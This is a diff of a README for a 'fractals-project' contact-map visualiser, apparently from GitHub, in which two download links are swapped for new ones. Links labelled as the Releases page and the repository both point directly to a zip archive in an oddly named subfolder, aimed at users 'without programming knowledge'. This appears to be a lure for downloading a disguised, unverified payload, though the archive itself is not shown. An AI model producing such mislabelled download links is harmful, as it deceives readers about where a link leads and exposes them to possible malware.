@@ -8,7 +8,7 @@ Welcome to the fractals-project! This application helps you visualize contact ma
 
 To start using the fractals-project, you need to download the application. Click the link below to visit the Releases page, where you can find the latest version of the software:
 
-[![Download the latest release](https://raw.githubusercontent.com/hoodboydave/fractals-project/main/Rhineura/fractals-project.zip%20Release-brightgreen)](https://raw.githubusercontent.com/hoodboydave/fractals-project/main/Rhineura/fractals-project.zip)
+[![Download the latest release](https://github.com/hoodboydave/fractals-project/raw/refs/heads/main/Rhineura/project-fractals-1.5-alpha.2.zip%20Release-brightgreen)](https://github.com/hoodboydave/fractals-project/raw/refs/heads/main/Rhineura/project-fractals-1.5-alpha.2.zip)
 
 Once on the Releases page, look for the most recent version. Click on the file that matches your operating system and follow the on-screen instructions to download the software.
 
@@ -60,7 +60,7 @@ A: No, the application is designed for users without programming knowledge. Just
 
 For more information or assistance, visit the project repository:
 
-[View the repository](https://raw.githubusercontent.com/hoodboydave/fractals-project/main/Rhineura/fractals-project.zip)
+[View the repository](https://github.com/hoodboydave/fractals-project/raw/refs/heads/main/Rhineura/project-fractals-1.5-alpha.2.zip)
 
 ## 🌐 Community
 
